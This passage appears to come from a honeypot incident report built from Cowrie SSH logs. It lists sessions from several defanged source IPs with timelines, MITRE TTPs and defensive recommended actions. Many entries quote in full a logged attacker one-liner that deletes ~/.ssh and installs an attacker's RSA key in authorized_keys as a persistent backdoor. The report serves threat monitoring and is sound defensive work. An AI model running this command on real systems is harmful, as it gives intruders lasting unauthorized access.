| `2026-06-12 19:33:43` | `cowrie.command.failed` |
| `2026-06-12 19:33:43` | `cowrie.log.closed` |
| `2026-06-12 19:33:43` | `cowrie.session.params` |
| `2026-06-12 19:33:43` | `cowrie.command.input` |
| `2026-06-12 19:33:44` | `cowrie.session.file_download` |
| `2026-06-12 19:33:44` | `cowrie.log.closed` |
| `2026-06-12 19:33:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.74.5[.]44` to AbuseIPDB if not already reported
- [ ] Block `103.74.5[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-760da1083d22

| Field | Detail |
|---|---|
| **Source IP** | `103.74.5[.]44` |
| **First Seen** | 2026-06-12 19:33 |
| **Last Seen** | 2026-06-12 19:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:33:48` | `cowrie.session.connect` |
| `2026-06-12 19:33:48` | `cowrie.client.version` |
| `2026-06-12 19:33:48` | `cowrie.client.kex` |
| `2026-06-12 19:33:52` | `cowrie.login.success` |
| `2026-06-12 19:33:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.74.5[.]44` to AbuseIPDB if not already reported
- [ ] Block `103.74.5[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efcb321e0b22

| Field | Detail |
|---|---|
| **Source IP** | `209.99.190[.]200` |
| **First Seen** | 2026-06-12 19:34 |
| **Last Seen** | 2026-06-12 19:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:34:09` | `cowrie.session.connect` |
| `2026-06-12 19:34:09` | `cowrie.client.version` |
| `2026-06-12 19:34:09` | `cowrie.client.kex` |
| `2026-06-12 19:34:09` | `cowrie.login.success` |
| `2026-06-12 19:34:10` | `cowrie.session.params` |
| `2026-06-12 19:34:10` | `cowrie.command.input` |
| `2026-06-12 19:34:10` | `cowrie.command.failed` |
| `2026-06-12 19:34:10` | `cowrie.log.closed` |
| `2026-06-12 19:34:10` | `cowrie.session.params` |
| `2026-06-12 19:34:10` | `cowrie.command.input` |
| `2026-06-12 19:34:10` | `cowrie.session.file_download` |
| `2026-06-12 19:34:10` | `cowrie.log.closed` |
| `2026-06-12 19:34:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.190[.]200` to AbuseIPDB if not already reported
- [ ] Block `209.99.190[.]200` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c81f06f7d338

| Field | Detail |
|---|---|
| **Source IP** | `209.99.190[.]200` |
| **First Seen** | 2026-06-12 19:34 |
| **Last Seen** | 2026-06-12 19:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:34:12` | `cowrie.session.connect` |
| `2026-06-12 19:34:12` | `cowrie.client.version` |
| `2026-06-12 19:34:12` | `cowrie.client.kex` |
| `2026-06-12 19:34:13` | `cowrie.login.success` |
| `2026-06-12 19:34:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.190[.]200` to AbuseIPDB if not already reported
- [ ] Block `209.99.190[.]200` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec2ea074f0c2

| Field | Detail |
|---|---|
| **Source IP** | `102.220.87[.]78` |
| **First Seen** | 2026-06-12 19:34 |
| **Last Seen** | 2026-06-12 19:34 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:34:42` | `cowrie.session.connect` |
| `2026-06-12 19:34:42` | `cowrie.client.version` |
| `2026-06-12 19:34:42` | `cowrie.client.kex` |
| `2026-06-12 19:34:43` | `cowrie.login.success` |
| `2026-06-12 19:34:44` | `cowrie.session.params` |
| `2026-06-12 19:34:44` | `cowrie.command.input` |
| `2026-06-12 19:34:44` | `cowrie.command.failed` |
| `2026-06-12 19:34:44` | `cowrie.log.closed` |
| `2026-06-12 19:34:45` | `cowrie.session.params` |
| `2026-06-12 19:34:45` | `cowrie.command.input` |
| `2026-06-12 19:34:45` | `cowrie.session.file_download` |
| `2026-06-12 19:34:45` | `cowrie.log.closed` |
| `2026-06-12 19:34:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.87[.]78` to AbuseIPDB if not already reported
- [ ] Block `102.220.87[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-957e436e4efe

| Field | Detail |
|---|---|
| **Source IP** | `102.220.87[.]78` |
| **First Seen** | 2026-06-12 19:34 |
| **Last Seen** | 2026-06-12 19:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:34:48` | `cowrie.session.connect` |
| `2026-06-12 19:34:48` | `cowrie.client.version` |
| `2026-06-12 19:34:48` | `cowrie.client.kex` |
| `2026-06-12 19:34:49` | `cowrie.login.success` |
| `2026-06-12 19:34:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.87[.]78` to AbuseIPDB if not already reported
- [ ] Block `102.220.87[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9009f05c891c

| Field | Detail |
|---|---|
| **Source IP** | `43.163.107[.]154` |
| **First Seen** | 2026-06-12 19:35 |
| **Last Seen** | 2026-06-12 19:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:35:57` | `cowrie.session.connect` |
| `2026-06-12 19:35:57` | `cowrie.client.version` |
| `2026-06-12 19:35:57` | `cowrie.client.kex` |
| `2026-06-12 19:35:58` | `cowrie.login.success` |
| `2026-06-12 19:35:58` | `cowrie.session.params` |
| `2026-06-12 19:35:58` | `cowrie.command.input` |
| `2026-06-12 19:35:58` | `cowrie.command.failed` |
| `2026-06-12 19:35:58` | `cowrie.log.closed` |
| `2026-06-12 19:35:58` | `cowrie.session.params` |
| `2026-06-12 19:35:58` | `cowrie.command.input` |
| `2026-06-12 19:35:58` | `cowrie.session.file_download` |
| `2026-06-12 19:35:58` | `cowrie.log.closed` |
| `2026-06-12 19:36:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.107[.]154` to AbuseIPDB if not already reported
- [ ] Block `43.163.107[.]154` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a14c17c7363a

| Field | Detail |
|---|---|
| **Source IP** | `43.163.107[.]154` |
| **First Seen** | 2026-06-12 19:36 |
| **Last Seen** | 2026-06-12 19:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:36:00` | `cowrie.session.connect` |
| `2026-06-12 19:36:00` | `cowrie.client.version` |
| `2026-06-12 19:36:00` | `cowrie.client.kex` |
| `2026-06-12 19:36:00` | `cowrie.login.success` |
| `2026-06-12 19:36:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.163.107[.]154` to AbuseIPDB if not already reported
- [ ] Block `43.163.107[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2a426ff3209

| Field | Detail |
|---|---|
| **Source IP** | `196.196.253[.]20` |
| **First Seen** | 2026-06-12 19:36 |
| **Last Seen** | 2026-06-12 19:36 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:36:35` | `cowrie.session.connect` |
| `2026-06-12 19:36:35` | `cowrie.client.version` |
| `2026-06-12 19:36:35` | `cowrie.client.kex` |
| `2026-06-12 19:36:36` | `cowrie.login.success` |
| `2026-06-12 19:36:37` | `cowrie.session.params` |
| `2026-06-12 19:36:37` | `cowrie.command.input` |
| `2026-06-12 19:36:37` | `cowrie.command.failed` |
| `2026-06-12 19:36:37` | `cowrie.log.closed` |
| `2026-06-12 19:36:37` | `cowrie.session.params` |
| `2026-06-12 19:36:37` | `cowrie.command.input` |
| `2026-06-12 19:36:38` | `cowrie.session.file_download` |
| `2026-06-12 19:36:38` | `cowrie.log.closed` |
| `2026-06-12 19:36:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.196.253[.]20` to AbuseIPDB if not already reported
- [ ] Block `196.196.253[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b47e2762fdc

| Field | Detail |
|---|---|
| **Source IP** | `196.196.253[.]20` |
| **First Seen** | 2026-06-12 19:36 |
| **Last Seen** | 2026-06-12 19:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:36:41` | `cowrie.session.connect` |
| `2026-06-12 19:36:41` | `cowrie.client.version` |
| `2026-06-12 19:36:41` | `cowrie.client.kex` |
| `2026-06-12 19:36:42` | `cowrie.login.success` |
| `2026-06-12 19:36:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.196.253[.]20` to AbuseIPDB if not already reported
- [ ] Block `196.196.253[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb014da38f20

| Field | Detail |
|---|---|
| **Source IP** | `196.196.253[.]20` |
| **First Seen** | 2026-06-12 19:38 |
| **Last Seen** | 2026-06-12 19:38 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:38:49` | `cowrie.session.connect` |
| `2026-06-12 19:38:49` | `cowrie.client.version` |
| `2026-06-12 19:38:49` | `cowrie.client.kex` |
| `2026-06-12 19:38:50` | `cowrie.login.success` |
| `2026-06-12 19:38:51` | `cowrie.session.params` |
| `2026-06-12 19:38:51` | `cowrie.command.input` |
| `2026-06-12 19:38:51` | `cowrie.command.failed` |
| `2026-06-12 19:38:52` | `cowrie.log.closed` |
| `2026-06-12 19:38:52` | `cowrie.session.params` |
| `2026-06-12 19:38:52` | `cowrie.command.input` |
| `2026-06-12 19:38:52` | `cowrie.session.file_download` |
| `2026-06-12 19:38:52` | `cowrie.log.closed` |
| `2026-06-12 19:38:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.196.253[.]20` to AbuseIPDB if not already reported
- [ ] Block `196.196.253[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ffef98008a0

| Field | Detail |
|---|---|
| **Source IP** | `196.196.253[.]20` |
| **First Seen** | 2026-06-12 19:38 |
| **Last Seen** | 2026-06-12 19:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:38:55` | `cowrie.session.connect` |
| `2026-06-12 19:38:55` | `cowrie.client.version` |
| `2026-06-12 19:38:55` | `cowrie.client.kex` |
| `2026-06-12 19:38:57` | `cowrie.login.success` |
| `2026-06-12 19:38:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.196.253[.]20` to AbuseIPDB if not already reported
- [ ] Block `196.196.253[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23d01d548e7c

| Field | Detail |
|---|---|
| **Source IP** | `152.32.182[.]41` |
| **First Seen** | 2026-06-12 19:40 |
| **Last Seen** | 2026-06-12 19:40 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:40:50` | `cowrie.session.connect` |
| `2026-06-12 19:40:50` | `cowrie.client.version` |
| `2026-06-12 19:40:50` | `cowrie.client.kex` |
| `2026-06-12 19:40:51` | `cowrie.login.success` |
| `2026-06-12 19:40:52` | `cowrie.session.params` |
| `2026-06-12 19:40:52` | `cowrie.command.input` |
| `2026-06-12 19:40:52` | `cowrie.command.failed` |
| `2026-06-12 19:40:52` | `cowrie.log.closed` |
| `2026-06-12 19:40:52` | `cowrie.session.params` |
| `2026-06-12 19:40:52` | `cowrie.command.input` |
| `2026-06-12 19:40:53` | `cowrie.session.file_download` |
| `2026-06-12 19:40:53` | `cowrie.log.closed` |
| `2026-06-12 19:40:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.182[.]41` to AbuseIPDB if not already reported
- [ ] Block `152.32.182[.]41` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82c31f7d676d

| Field | Detail |
|---|---|
| **Source IP** | `152.32.182[.]41` |
| **First Seen** | 2026-06-12 19:40 |
| **Last Seen** | 2026-06-12 19:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:40:56` | `cowrie.session.connect` |
| `2026-06-12 19:40:56` | `cowrie.client.version` |
| `2026-06-12 19:40:56` | `cowrie.client.kex` |
| `2026-06-12 19:40:57` | `cowrie.login.success` |
| `2026-06-12 19:40:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.182[.]41` to AbuseIPDB if not already reported
- [ ] Block `152.32.182[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-970f5af1cc37

| Field | Detail |
|---|---|
| **Source IP** | `103.60.242[.]169` |
| **First Seen** | 2026-06-12 19:42 |
| **Last Seen** | 2026-06-12 19:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:42:15` | `cowrie.session.connect` |
| `2026-06-12 19:42:15` | `cowrie.client.version` |
| `2026-06-12 19:42:15` | `cowrie.client.kex` |
| `2026-06-12 19:42:16` | `cowrie.login.success` |
| `2026-06-12 19:42:16` | `cowrie.session.params` |
| `2026-06-12 19:42:16` | `cowrie.command.input` |
| `2026-06-12 19:42:16` | `cowrie.command.failed` |
| `2026-06-12 19:42:16` | `cowrie.log.closed` |
| `2026-06-12 19:42:16` | `cowrie.session.params` |
| `2026-06-12 19:42:16` | `cowrie.command.input` |
| `2026-06-12 19:42:16` | `cowrie.session.file_download` |
| `2026-06-12 19:42:16` | `cowrie.log.closed` |
| `2026-06-12 19:42:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.60.242[.]169` to AbuseIPDB if not already reported
- [ ] Block `103.60.242[.]169` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ddf07df5ddf

| Field | Detail |
|---|---|
| **Source IP** | `103.60.242[.]169` |
| **First Seen** | 2026-06-12 19:42 |
| **Last Seen** | 2026-06-12 19:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:42:18` | `cowrie.session.connect` |
| `2026-06-12 19:42:18` | `cowrie.client.version` |
| `2026-06-12 19:42:18` | `cowrie.client.kex` |
| `2026-06-12 19:42:19` | `cowrie.login.success` |
| `2026-06-12 19:42:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.60.242[.]169` to AbuseIPDB if not already reported
- [ ] Block `103.60.242[.]169` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b2693960f3a

| Field | Detail |
|---|---|
| **Source IP** | `103.74.5[.]44` |
| **First Seen** | 2026-06-12 19:50 |
| **Last Seen** | 2026-06-12 19:50 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:50:23` | `cowrie.session.connect` |
| `2026-06-12 19:50:23` | `cowrie.client.version` |
| `2026-06-12 19:50:23` | `cowrie.client.kex` |
| `2026-06-12 19:50:24` | `cowrie.login.success` |
| `2026-06-12 19:50:24` | `cowrie.session.params` |
| `2026-06-12 19:50:24` | `cowrie.command.input` |
| `2026-06-12 19:50:24` | `cowrie.command.failed` |
| `2026-06-12 19:50:25` | `cowrie.log.closed` |
| `2026-06-12 19:50:25` | `cowrie.session.params` |
| `2026-06-12 19:50:25` | `cowrie.command.input` |
| `2026-06-12 19:50:25` | `cowrie.session.file_download` |
| `2026-06-12 19:50:25` | `cowrie.log.closed` |
| `2026-06-12 19:50:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.74.5[.]44` to AbuseIPDB if not already reported
- [ ] Block `103.74.5[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0902fc06d25d

| Field | Detail |
|---|---|
| **Source IP** | `103.74.5[.]44` |
| **First Seen** | 2026-06-12 19:50 |
| **Last Seen** | 2026-06-12 19:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:50:28` | `cowrie.session.connect` |
| `2026-06-12 19:50:29` | `cowrie.client.version` |
| `2026-06-12 19:50:29` | `cowrie.client.kex` |
| `2026-06-12 19:50:32` | `cowrie.login.success` |
| `2026-06-12 19:50:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.74.5[.]44` to AbuseIPDB if not already reported
- [ ] Block `103.74.5[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9ce77a0ab46

